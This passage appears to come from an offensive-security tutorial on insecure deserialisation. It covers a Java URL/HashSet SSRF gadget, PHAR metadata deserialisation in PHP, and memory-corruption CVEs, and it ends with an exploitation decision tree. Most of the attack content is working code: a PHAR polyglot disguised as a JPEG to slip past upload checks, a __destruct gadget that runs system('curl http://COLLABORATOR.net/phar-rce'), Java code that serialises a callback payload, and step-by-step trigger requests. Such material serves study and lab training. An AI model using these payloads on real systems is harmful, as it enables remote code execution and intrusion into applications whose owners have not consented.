// If attacker controls cacheFile, can point to an attacker-controlled
// serialised object file → deserialise arbitrary content!

// Step 2: Find equals()/hashCode() for HashMap-triggered chains
public class RequestToken implements Serializable {
    private String url;

    @Override
    public int hashCode() {
        try {
            // Makes HTTP request to compute hash!
            URL u = new URL(this.url);
            return u.openConnection().getResponseCode();
        } catch (Exception e) { return 0; }
    }
}

// HashSet/HashMap in readObject() will call hashCode()!
// Chain: readObject() with HashMap → hashCode() → HTTP request to attacker URL!
// Confirmed as SSRF gadget via HashMap chain

// Constructing chain programmatically:
import java.io.*;
import java.util.HashSet;
import java.net.URL;

// Create malicious object:
URL maliciousUrl = new URL("http://COLLABORATOR.net/confirm-rce");
// Wrap in HashSet (triggers hashCode() on deserialisation):
HashSet<URL> set = new HashSet<>();
set.add(maliciousUrl);

// Serialise:
ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(set);
String payload = Base64.getEncoder().encodeToString(bos.toByteArray());
System.out.println(payload);
// Submit this Base64 → rO0AB... → server deserialises → hashCode() fires → HTTP request!
```

## Stage 8: PHAR Deserialisation

### Implicit PHP deserialisation via filesystem operations

**Understanding PHAR metadata deserialisation:** 

```
PHAR (PHP ARchive) file structure:
┌──────────────────────────────────────┐
│  PHAR stub (<?php __HALT_COMPILER(); ?>)  │
├──────────────────────────────────────┤
│  PHAR manifest (SERIALISED metadata!) │  ← Deserialised by ANY filesystem op!
├──────────────────────────────────────┤
│  File contents (the actual files)    │
└──────────────────────────────────────┘

The critical property:
PHP automatically deserialises the PHAR manifest
whenever ANY filesystem function operates on a phar:// stream

Functions that trigger PHAR deserialisation:
file_exists()          ← Often unprotected — "harmless" function!
file_get_contents()
file_put_contents()
fopen()
is_file()
is_dir()
mkdir()
rename()
copy()
unlink()
stat()
filetype()
glob()
opendir()
include() / require() (protected, but included for completeness)
imagecreatefrom*()     ← PHP GD image functions!
SimpleXMLLoadFile()
DOMDocument::load()
ZipArchive::open()
... and many more

Key insight:
Functions like file_exists() appear completely safe
Developers don't protect them as carefully as include() or eval()
But: file_exists('phar://evil.jpg') triggers full PHP deserialisation!
```

**Creating a PHAR polyglot (PHAR disguised as JPEG):** 

```php
<?php
// Create PHAR payload with gadget chain in metadata
// Requires: php.ini setting phar.readonly = Off (or command line -d phar.readonly=0)

// Step 1: Define the gadget chain class (replicate from target)
class GadgetClass {
    public $command = 'curl http://COLLABORATOR.net/phar-rce';

    public function __destruct() {
        system($this->command);
    }
}

// Step 2: Create the PHAR file
$phar = new Phar('payload.phar');
$phar->startBuffering();

// PHAR needs at least one file:
$phar->addFromString('placeholder.txt', 'placeholder content');

// Set the gadget chain object as PHAR metadata:
$gadget = new GadgetClass();
$phar->setMetadata($gadget);      // Serialised gadget stored in PHAR manifest!

// PHAR stub (required):
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
// Creates: payload.phar

// Step 3: Disguise as JPEG (polyglot)
// Method 1: Simple rename
rename('payload.phar', 'payload.jpg');

// Method 2: Prepend valid JPEG header to bypass magic-byte checks
$jpeg_header = "\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01";
$phar_content = file_get_contents('payload.phar');
file_put_contents('payload.jpg', $jpeg_header . $phar_content);

// Now payload.jpg:
// → Starts with valid JPEG magic bytes (FFD8FF) → passes MIME type check!
// → IS a valid PHAR file with embedded gadget chain in metadata!
// → A true polyglot: valid JPEG AND valid PHAR simultaneously
```

**Complete PHAR exploitation attack chain:** 

```
PREREQUISITE CONDITIONS for PHAR attack:
1. PHP application (PHAR is PHP-specific)
2. File upload functionality exists (to upload the PHAR)
3. Application uses user-controllable data in a filesystem function
4. Application has a class with exploitable magic methods

Attack Step 1: Create PHAR polyglot (JPG that is also PHAR)
→ Follow PHAR creation script above
→ Embed gadget chain in metadata

Attack Step 2: Upload PHAR as "image"
→ Use file upload endpoint (profile picture, attachment, etc.)
→ JPEG headers bypass getimagesize() and MIME checks
→ Note the server-side file path of uploaded file:
   e.g., /var/www/html/uploads/avatar_carlos.jpg

Attack Step 3: Find filesystem function taking user-controllable path
→ Source code: grep -rn "file_exists\|fopen\|is_file\|glob" ./src/
→ Black-box: look for functionality that "loads" user-specified resources
→ Example vulnerable code:
   $avatar = $_GET['avatar_path'];
   if (file_exists('/var/www/html' . $avatar)) {
       // Display avatar
   }

Attack Step 4: Trigger PHAR deserialisation
→ Craft request with phar:// wrapper pointing to uploaded file:
   GET /profile?avatar_path=phar://uploads/avatar_carlos.jpg
→ Server executes: file_exists('phar://uploads/avatar_carlos.jpg')
→ PHP processes phar:// stream → reads PHAR file
→ PHAR manifest deserialised automatically!
→ GadgetClass object instantiated with attacker's $command attribute
→ __destruct() fires: system('curl http://COLLABORATOR.net/phar-rce')
→ RCE CONFIRMED!

Note on file extension:
When accessed via phar:// wrapper:
file_exists('phar://uploads/avatar.jpg')
→ PHP reads the PHAR internal structure (PHAR format, not JPEG)
→ The .jpg extension is IGNORED by PHP's PHAR reader
→ Extension only matters for upload validation, not for phar:// access!
```

**Black-box PHAR attack when source code unavailable:**

```
Without source code — finding filesystem function inputs:
Look for application features that:
→ Load user-specified files: "Load template", "Import data", "Preview file"
→ Process user-specified paths: URL parameters containing file paths
→ Cache user content referencing file locations
→ Avatar/profile picture URLs that are loaded server-side

Test for phar:// acceptance:
Inject: phar://nonexistent.phar/test
→ Different error? "phar://nonexistent.phar/test: failed to open stream"
→ vs normal "file not found" → confirms phar:// wrapper processed!

Trigger PHAR with Collaborator for blind confirmation:
Create PHAR with metadata containing object that triggers DNS:
<?php
class DNSGadget {
    public function __destruct() {
        dns_get_record('phar-deserialised.COLLABORATOR.net');
    }
}
// Embed DNSGadget in PHAR metadata
// Upload and trigger as above
// DNS interaction = PHAR deserialisation confirmed!
```

## Stage 9: Memory Corruption Exploitation

**Beyond gadget chains — native deserialisation vulnerabilities:** 

```
Deserialisation methods themselves (unserialize(), readObject(), etc.)
are implemented in native C/C++ code (for PHP, JVM internals)
These native implementations have had memory corruption bugs!

Why this matters:
Even without any gadget chains
Even if ALL possible gadget chains were eliminated
Even on strongly-typed languages
→ Memory corruption in the deserialisation engine itself can lead to RCE!

Historical PHP unserialize() memory corruption:
CVE-2016-7124: __wakeup bypass — bypass magic method restrictions
CVE-2016-7478: Memory exhaustion — DoS via infinite object nesting
CVE-2014-8142: Use-after-free in unserialize() → RCE
CVE-2015-0231: Use-after-free in unserialize() → RCE
CVE-2015-6831: Use-after-free in SPL classes during unserialisation
Multiple CVEs: Heap overflows via malformed SPL object structures

Java ObjectInputStream memory issues:
JDK deserialisation bugs (pre-JDK6u113, JDK7u91 era):
→ Allocation exhaustion via deeply nested serialised arrays
→ Large byte array deserialisation causing JVM OOM
→ Type confusion leading to ClassCastException → information disclosure

Exploitation approach for memory corruption:
1. Check CVE databases for known unserialize() CVEs for target version
2. Identify PHP/JVM version from headers (X-Powered-By, Server: headers)
3. Find public proof-of-concept exploit code
4. Adapt to specific target (may require local environment testing)
5. Memory corruption exploits often less reliable than gadget chains
   but relevant when gadget chain avenue is fully exhausted

Important note from PortSwigger:
"These methods are not intended to handle user-controllable input
 in the first place" — memory corruption in deserialisation is
 a consequence of violating this fundamental design assumption.
 The correct fix remains: never deserialise user-controlled input.
```

## Complete Exploitation Decision Tree

```
[Found serialised data in application traffic]
         │
         ▼
[Identify format]
         │
         ├── PHP (O:n:): Human-readable text
         │        │
         │        ├── Modify primitive attributes → privilege escalation
         │        ├── Modify data types → type juggling exploits
         │        ├── Use application functionality → file operations
         │        ├── Try phpggc framework chains
         │        ├── Inject arbitrary objects → magic method exploitation
         │        ├── Build custom chain from source → advanced RCE
         │        └── Upload PHAR + trigger filesystem function → PHAR RCE
         │
         ├── Java (rO0A / AC ED): Binary format
         │        │
         │        ├── Try URLDNS chain → confirm deserialisation
         │        ├── Try JRMPClient → blind confirmation via TCP
         │        ├── Try all ysoserial chains with DNS callback
         │        ├── Identified chain + RCE payload → code execution
         │        └── Build custom chain from source if no match
         │
         ├── Ruby (BAh / \x04\x08): Marshal format
         │        │
         │        ├── Check for Gem::Requirement chain (Ruby 2.x)
         │        ├── Search for documented Ruby deserialization exploits
         │        └── Build custom chain from Gemfile dependencies
         │
         └── .NET (AAEAAAD): BinaryFormatter
                  └── ysoserial.net for .NET gadget chains

At each stage: use out-of-band (OAST) callbacks to confirm blind execution
```
